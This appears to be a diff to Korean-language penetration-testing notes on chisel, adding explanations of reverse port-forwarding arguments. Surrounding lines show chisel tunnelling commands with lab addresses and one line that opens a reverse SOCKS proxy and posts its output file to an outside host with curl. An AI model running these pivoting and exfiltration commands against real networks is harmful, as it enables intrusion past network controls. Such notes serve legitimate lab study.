@@ -128,6 +128,8 @@ chisel server --port 8080 --reverse
 ```bash
 chisel client 10.10.14.3:8000 R:80:127.0.0.1:80
 ```
+- `10.10.14.3` : 세션수립
+- `R:2000:127.0.0.1:3000` : 서버의 2000포트를 터널링으로 만들고 2000번 포트로 들어오는 패킷을 클라이언트의 3000번 포트로 전달해라.
 
 ```bash
 /tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
